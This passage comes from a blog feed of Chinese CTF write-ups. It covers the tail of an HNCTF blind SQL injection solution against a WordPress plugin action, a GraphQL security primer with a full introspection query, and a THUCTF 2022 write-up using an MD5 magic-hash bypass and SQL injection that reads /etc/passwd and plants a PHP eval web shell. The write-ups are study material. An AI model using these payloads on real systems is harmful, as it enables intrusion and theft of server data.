group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))&gt;127),sleep(1),0))a)</span><br><span class="hljs-comment">#action=qcopd_upvote_action&amp;post_id=(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x77705f7573657273),1,1))&gt;32),sleep(1),0))a)</span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-746a-4cd7-ae2e-bc6c1827ec08&#125;  </span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-749a-4cd7-ae2e-bc6c1827ecs8&#125;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#NSSCTF&#123;dd697eee-749a-4cd7-ae2e-bc6c1827ec08&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>HNCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphQL浅记</title>
    <link href="/2022/10/04/GraphQL/"/>
    <url>/2022/10/04/GraphQL/</url>
    
    <content type="html"><![CDATA[<p>在2022New Star碰到GraphQL相关题目（ezAPI），记录一下GraphQL的学习。</p><h2 id="GraphQL简介"><a href="#GraphQL简介" class="headerlink" title="GraphQL简介"></a>GraphQL简介</h2><p>GraphQL是由Facebook开发并于2015年公开发布的<strong>数据查询语言</strong>。是REST API的替代品。作为一种 API 查询语言，GraphQL 不要求实现它的应用服务器使用特定的编程语言或存储系统，且它与底层数据库无关，可以与MySQL数据库一起使用，也可以与Nosql数据库搭配。</p><p>与其类似的还有RESTful API，区别在于，RESTful API需要多个API实现不同的功能，而GraphQL获取多个资源，只用一个请求。但是也不是所有需求都适用GraphQL，简单的需求还是使用RESTful API，GraphQL查询的数据是图状数据结构，一些没有图的概念的数据使用GraphQL并没有显著的效果。</p><p>SQL是结构化查询语言，GraphQL是图表化查询语言。</p><h2 id="GraphQL查询响应格式"><a href="#GraphQL查询响应格式" class="headerlink" title="GraphQL查询响应格式"></a>GraphQL查询响应格式</h2><p>基本的GraphQL查询</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">query</span>&#123;<br>  <span class="hljs-keyword">user</span>&#123;<br>​    <span class="hljs-built_in">id</span><br>​    email<br>​    firstName<br>​    lastName<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>基本的GraphQL响应</p><p>响应结果则是json类型：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;user&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;666&quot;</span>,<br>            <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;xxx@qq.com&quot;</span>,<br>            <span class="hljs-string">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;xx&quot;</span>,<br>            <span class="hljs-string">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;xx&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>官方文档：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">查询和其结果拥有几乎一样的结构。这是 GraphQL 最重要的特性，<br>因为这样一来，你就总是能得到你想要的数据，而服务器也准确地知道客户端请求的字段。<br></code></pre></td></tr></table></figure><p> 例如这样的</p><p><img src="/Users/yinbing\AppData\Roaming\Typora\typora-user-images\image-20221004200939127.png" alt="image-20221004200939127"></p><p>类似于json，但是有很多换行符。</p><h2 id="GraphQL主要操作"><a href="#GraphQL主要操作" class="headerlink" title="GraphQL主要操作"></a>GraphQL主要操作</h2><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>GraphQL 关于请求对象上的特定字段，即要操作（查询更改…）的对象。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>GraphQL 对象类型上的每一个字段都可能有零个或者多个参数。</p><p><strong>GraphQL基本参数类型</strong></p><ul><li>String, Int, Float, <a href="https://so.csdn.net/so/search?q=Boolean&spm=1001.2101.3001.7020">Boolean</a>和ID。在schema声明时直接使用。 （ID不能重复使用）</li><li>!（叹号）代表参数不能为空。</li></ul><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>类似于SQL的增删改查，GraphQL主要有三种操作query、mutation 和 subscription，分别对应查询、变更和订阅。</p><p>官方文档：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs graphql">操作类型可以是 <span class="hljs-keyword">query</span>、<span class="hljs-keyword">mutation</span> 或 <span class="hljs-keyword">subscription</span>，<br>描述你打算做什么类型的操作。操作类型是必需的，<br>除非你使用查询简写语法，在这种情况下，你无法为操作提供名称或变量定义。<br></code></pre></td></tr></table></figure><h3 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h3><p>GraphQL内置了内省系统，通过它给出的内省方法，我们可以获得对象名称、类型、参数等多种信息。</p><p>官方文档：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf">我们也可以通过查询 <span class="hljs-variable">__schema</span> 字段来向 GraphQL 询问哪些类型是可用的。<br>一个查询的根类型总是有 <span class="hljs-variable">__schema</span> 这个字段。<br><br>有好多类型！它们都是什么？我们来总结一下：<br>    Query, Character, Human, Episode, Droid <br>    - 这些是我们在类型系统中定义的类型。<br>    String, Boolean <br>    - 这些是内建的标量，由类型系统提供。<br>    <span class="hljs-variable">__Schema</span>, <span class="hljs-variable">__Type</span>, <span class="hljs-variable">__TypeKind</span>, <span class="hljs-variable">__Field</span>, <span class="hljs-variable">__InputValue</span>, <span class="hljs-variable">__EnumValue</span>, <span class="hljs-variable">__Directive</span> <br>    - 这些有着两个下划线的类型是内省系统的一部分。<br></code></pre></td></tr></table></figure><p>我的理解：information_schema（像不像 (*^▽^*)</p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p> 上述查询是<strong>可交互的</strong>。也就是你可以按你喜欢来改变查询，然后看看新的结果。(也就是可以更改查询语句得到想要的结果)</p><p>GraphQL 对象类型上的每一个字段都可能有零个或者多个参数。（参数个数不同可能得不到我们想要的内容，比如flag）</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:1)&#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<span class="hljs-string">&quot;query&quot;</span>:<br><span class="hljs-string">&quot;query&#123;</span><br>users_user_by_pk(id:<span class="hljs-number">1</span>)<br>&#123;<br>name<br>&#125;<br>&#125;<br><span class="hljs-string">&quot;,&quot;</span>variables<span class="hljs-string">&quot;:null&#125;</span><br></code></pre></td></tr></table></figure><p>从users_user_by_pk这个接口查询id&#x3D;1的字段的name属性。</p><h2 id="GraphQL-端点"><a href="#GraphQL-端点" class="headerlink" title="GraphQL 端点"></a>GraphQL 端点</h2><p>常见的GraphQL端点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/graphql/</span><br><span class="hljs-regexp">/graphql/</span>console/<br>/graphql.php<br><span class="hljs-regexp">/graphiql/</span><br>/graphiql.php<br>[...]<br></code></pre></td></tr></table></figure><p>可以通过向端点发送一个无效查询，是否报错判断端点。</p><p>在测试应用程序时，验证是否可以在没有一般授权令牌标头的情况下发出请求，因为GraphQL本身没有提供任何数据保护手段，只能通过其他方法进行访问控制，不让端点被恶意利用。</p><h2 id="GraphQL可能存在的隐患"><a href="#GraphQL可能存在的隐患" class="headerlink" title="GraphQL可能存在的隐患"></a>GraphQL可能存在的隐患</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>开发者在使用时经常会忽略接口的鉴权问题。导致访问控制容易被破坏，不安全的对象直接引用甚至SQL或NoSQL进行注入。有时候客户端调用查询接口，直接传入了id等信息并未做好权限校验，就有可能存在水平越权。</p><h3 id="GraphQL内省查询"><a href="#GraphQL内省查询" class="headerlink" title="GraphQL内省查询"></a>GraphQL内省查询</h3><p>最常见的问题，内省查询本来应该是仅允许内部访问，但<strong>配置错误</strong>导致任何攻击者可以利用内省查询。</p><p>payload：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;&quot;query&quot;:&quot;&#123;__schema&#123;queryType&#123;name&#125;</span><span class="language-xml">,mutationType</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml">,subscriptionType</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml">,types</span><span class="hljs-template-variable">&#123;...FullType&#125;</span><span class="language-xml">,directives</span><span class="hljs-template-variable">&#123;name,description,locations,args&#123;...InputValue&#125;</span><span class="language-xml">&#125;&#125;&#125;,fragment FullType on __Type</span><span class="hljs-template-variable">&#123;kind,name,description,fields(includeDeprecated:true)&#123;name,description,args&#123;...InputValue&#125;</span><span class="language-xml">,type</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">,isDeprecated,deprecationReason&#125;,inputFields</span><span class="hljs-template-variable">&#123;...InputValue&#125;</span><span class="language-xml">,interfaces</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">,enumValues(includeDeprecated:true)</span><span class="hljs-template-variable">&#123;name,description,isDeprecated,deprecationReason&#125;</span><span class="language-xml">,possibleTypes</span><span class="hljs-template-variable">&#123;...TypeRef&#125;</span><span class="language-xml">&#125;,fragment InputValue on __InputValue</span><span class="hljs-template-variable">&#123;name,description,type&#123;...TypeRef&#125;</span><span class="language-xml">,defaultValue&#125;,fragment TypeRef on __Type</span><span class="hljs-template-variable">&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name,ofType&#123;kind,name&#125;</span><span class="language-xml">&#125;&#125;&#125;&#125;&#125;&#125;&#125;&quot;,&quot;variables&quot;:</span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p>返回包返回的就是该API端点的所有信息。</p><p>通过内省查询得到很多接口信息，造成信息泄露。</p><h3 id="嵌套查询DoS"><a href="#嵌套查询DoS" class="headerlink" title="嵌套查询DoS"></a>嵌套查询DoS</h3><p>当业务的变量互相关联，如以下graphql定义为这样时，就可能无限展开，造成拒绝服务。</p><p>它们可以允许恶意客户端通过<strong>过度复杂的查询</strong>来执行DoS（拒绝服务）攻击，占用服务器的资源。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Thread</span> &#123;<br>  messages(first: <span class="hljs-type">Int</span>, after: <span class="hljs-type">String</span>): [<span class="hljs-type">Message</span>]<br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-type">Message</span> &#123;<br>  thread: <span class="hljs-type">Thread</span><br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-type">Query</span> &#123;<br>  thread(id: <span class="hljs-type">ID</span>!): <span class="hljs-type">Thread</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210042341981.png" alt="image-20221004232945314"></p><p>针对DoS的简单修复方式可以是设置超时，最大深度或查询复杂度阈值。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p> graphql的sql注入与一般的sql注入类似，都是可以通过构造恶意语句达到注入获取数据或改变查询逻辑的目的。p神在先知大会上讲过该类问题，借用p神的2张PPT。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210042342282.png" alt="image-20221004233248293"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>参考2022NewStarCTF ezAPI。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html">https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</a></p><p><a href="https://www.anquanke.com/post/id/147455#h2-9">https://www.anquanke.com/post/id/147455#h2-9</a></p><p><a href="https://www.secpulse.com/archives/148242.html">https://www.secpulse.com/archives/148242.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/124019191#">https://zhuanlan.zhihu.com/p/124019191#</a></p><p><a href="https://www.zhihu.com/question/264629587">https://www.zhihu.com/question/264629587</a></p><p><a href="https://zhuanlan.zhihu.com/p/506391425">https://zhuanlan.zhihu.com/p/506391425</a></p><p><a href="https://blog.csdn.net/A_bad_horse/article/details/105377150">https://blog.csdn.net/A_bad_horse/article/details/105377150</a></p><p>官方文档：</p><p><a href="https://graphql.bootcss.com/">https://graphql.bootcss.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
      <tag>GraphQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022THU CTF</title>
    <link href="/2022/10/04/2022THUCTF/"/>
    <url>/2022/10/04/2022THUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="THUCTF-2022"><a href="#THUCTF-2022" class="headerlink" title="THUCTF 2022"></a>THUCTF 2022</h1><p>部分wp，又被大佬们吊打了捏-。-</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012033544.png" alt="image-20221001203336959"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="What-is-flag1"><a href="#What-is-flag1" class="headerlink" title="What is $? - flag1"></a>What is $? - flag1</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>PHP<br></code></pre></td></tr></table></figure><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// error_reporting(1);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>) </span>&#123;<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$class</span>)).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(<span class="hljs-string">&#x27;autoload&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) || (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]))))<br>    <span class="hljs-keyword">die</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;access denied&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">require_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) || !<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;access denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_user&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/a/si&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_pass&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cb_salt&#x27;</span>].<span class="hljs-string">&#x27;a&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">die</span>(lib<span class="hljs-title class_">\Flag</span>::<span class="hljs-variable constant_">FLAG1</span>);<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try harder&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;save_item&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">require_admin</span>();<br><br>        <span class="hljs-variable">$item_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$item_uuid</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;uuid&#x27;</span>];<br>        <span class="hljs-variable">$item_content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;item&#x27;</span>][<span class="hljs-string">&#x27;content&#x27;</span>];<br>        <span class="hljs-variable">$item_filename</span> = <span class="hljs-string">&#x27;up/&#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$item_name</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9]*$/&#x27;</span>, <span class="hljs-variable">$item_name</span>) || !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\S&#123;8&#125;-\S&#123;27&#125;$/&#x27;</span>, <span class="hljs-variable">$item_uuid</span>))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;blanket and special characters is not allowed in item name or uuid is invalid&#x27;</span>);<br><br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> lib\<span class="hljs-title function_ invoke__">DB</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;INSERT INTO items (`name`, `uuid`, `filename`) VALUES (&#x27;<span class="hljs-subst">$item_name</span>&#x27;, &#x27;<span class="hljs-subst">$item_uuid</span>&#x27;, &#x27;<span class="hljs-subst">$item_filename</span>&#x27;)&quot;</span>)) &#123;<br>            @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$item_filename</span>, <span class="hljs-variable">$item_content</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;success&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;internal server error&#x27;</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list_item&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">require_admin</span>();<br>        <br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> lib\<span class="hljs-title function_ invoke__">DB</span>();<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM items&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;--- start &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;uuid&#x27;</span>].<span class="hljs-string">&#x27; ---&lt;br/&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Content: &#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;---  end  &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;uuid&#x27;</span>].<span class="hljs-string">&#x27; ---&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;unsupported action&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">cb_<span class="hljs-attr">user</span><span class="hljs-operator">=</span>admin<span class="hljs-variable">&amp;cb_pass</span>=QNKCDZO<span class="hljs-variable">&amp;cb_salt</span>=s878926199<span class="hljs-variable">&amp;action</span>=login<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012031439.png" alt="image-20220929234203762"></p><h2 id="What-is-flag2"><a href="#What-is-flag2" class="headerlink" title="What is $? - flag2"></a>What is $? - flag2</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g2</span>是不是会跟fla<span class="hljs-name">g1</span>在一起呢？fla<span class="hljs-name">g1</span>在哪呢？<br>spl_autoload_register<br>sssssqqqqqllllllll<br>嘟嘟嘟嘟嘟嘟稳健<br></code></pre></td></tr></table></figure><p>save_item的uuid可控，造成sql注入，任意读取文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">item[name]=admin&amp;item[uuid]=40233990-fc0f1247&#x27;,&#x27;/etc/passwd&#x27;)###&amp;item[content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030406.png" alt="image-20220930200233394"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030551.png" alt="image-20220930223207122"></p><p>注意看这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// error_reporting(1);</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>) </span>&#123;<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$class</span>)).<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(<span class="hljs-string">&#x27;autoload&#x27;</span>);<br></code></pre></td></tr></table></figure><p>可以得到flag的路径为.&#x2F;lib&#x2F;flag.php</p><p>payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">item[name]=admin&amp;item[uuid]=40233990-fgc7l&#x27;,&#x27;./lib/flag.php&#x27;)###&amp;item[content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span 